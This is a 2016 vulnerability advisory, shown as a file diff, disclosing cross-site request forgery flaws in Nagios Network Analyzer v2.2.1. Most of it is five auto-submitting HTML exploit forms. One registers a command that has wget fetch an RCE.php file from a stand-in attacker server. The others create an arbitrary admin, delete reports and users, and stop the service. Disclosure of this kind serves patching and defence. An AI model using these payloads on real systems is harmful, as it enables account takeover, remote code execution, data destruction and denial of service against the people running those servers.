@@ -1,0 +1,149 @@
+[+] Credits: John Page ( hyp3rlinx )
+[+] Website: hyp3rlinx.altervista.org
+[+] Source: http://hyp3rlinx.altervista.org/advisories/NAGIOS-NA-v2.2.1-MULTIPLE-CSRF.txt
+[+] ISR: ApparitionSec
+
+
+Vendor:
+===============
+www.nagios.com
+
+
+Product:
+==============================
+Nagios Network Analyzer v2.2.1
+
+Netflow Analysis, Monitoring, and Bandwidth Utilization Software
+
+Network Analyzer provides an in-depth look at all network traffic sources
+and potential security threats allowing system
+admins to quickly gather high-level information regarding the health of the
+network as well as highly granular data for
+complete and thorough network analysis.
+
+
+Vulnerability Type:
+=================================
+Cross Site Request Forgery (CSRF)
+
+
+CVE Reference:
+==============
+N/A
+
+
+Vulnerability Details:
+=====================
+
+Nagios NA has multiple CSRF vectors, allowing unauthorized commands to be
+transmitted from a user that the website trusts if that user is
+authenticated and visits a malicious webpage or clicks a attacker supplied
+link. The Nagios system can be compromised as remote attackers
+can create arbitrary commands e.g. using "wget" to download RCE files onto
+the system, create arbitrary Admins, delete users, and conduct
+DOS attacks.
+
+
+Exploit code(s):
+================
+
+1) Create arbitrary commands
+
+<form action="
+http://victim-server/nagiosna/index.php/api/system/create_command"
+method="post">
+<input type="hidden" name="name" value="pwn">
+<input type="hidden" name="location" value="%2Fusr%2Fbin%2Fwget">
+<input type="hidden" name="script" value="wget">
+<input type="hidden" name="args"
+value="http%3A%2F%2Fattacker-server%2FRCE.php">
+<script>document.forms[0].submit()</script>
+</form>
+
+
+2) Add Admin
+
+<form action="http://victim-server/nagiosna/index.php/admin/users/create"
+method="post" accept-charset="utf-8">
+<input type="text" name="first_name" value="CSRF">
+<input type="text" name="last_name" value="ME">
+<input type="text" name="company" value="PWN">
+<input type="text" name="email" value="evil@abyss.com">
+<input type="text" name="phone" value="">
+<input type="text" name="username" value="HYP3RLINX">
+<input type="password" name="password" value="abc123">
+<input type="password" name="password2" value="abc123">
+<input type="hidden" name="language" value="default" >
+<input type="hidden" name="account_type" id="account_type" value="local">
+<input type="hidden" name="ldap_server" id="ldap_server">
+<input type="hidden" name="ad_server" id="ad_server" value="1">
+
+<input type="text" name="ad_username" id="ad_username">
+<input type="text" name="dn"  placeholder="cn=John Smith,dn=nagios,dc=com">
+<input type="radio" name="group" value="1" checked="true" >
+<input type="radio" name="apiaccess" value="1" >
+<input type="radio" name="apiaccess" value="0" checked>
+
+<script>document.forms[0].submit()</script>
+</form>
+
+
+3) Delete reports (report ID must be known or guessed)
+
+<form action="http://victim-server/nagiosna/index.php/api/reports/delete"
+method="post">
+<input type="hidden" name="q[rid]" value="9">
+<script>document.forms[0].submit()</script>
+</form>
+
+
+4) DOS
+
+<form action="http://victim-server/nagiosna/index.php/api/system/stop"
+method="post">
+<input type="hidden" name="sid" value="1">
+<script>//document.forms[0].submit()</script>
+</form>
+
+
+5) Delete users (user ID must be known or guessed)
+
+<form action="http://victim-server/nagiosna/index.php/admin/users/delete"
+method="post">
+<input type="hidden" name="id" value="10">
+<script>document.forms[0].submit()</script>
+</form>
+
+
+Disclosure Timeline:
+======================================
+Vendor Notification:  July 20, 2016
+Vendor Acknowledgement: July 21, 2016
+Vendor Fix / Release: August 1, 2016
+August 8, 2016 : Public Disclosure
+
+
+Exploitation Technique:
+=======================
+Remote
+
+
+Severity Level:
+===============
+Medium
+
+
+[+] Disclaimer
+The information contained within this advisory is supplied "as-is" with no
+warranties or guarantees of fitness of use or otherwise.
+Permission is hereby granted for the redistribution of this advisory,
+provided that it is not altered except by reformatting it, and
+that due credit is given. Permission is explicitly given for insertion in
+vulnerability databases and similar, provided that due credit
+is given to the author. The author is not responsible for any misuse of the
+information contained herein and accepts no responsibility
+for any damage caused by the use or misuse of this information. The author
+prohibits any malicious use of security related information
+or exploits by the author or elsewhere.
+
+HYP3RLINX
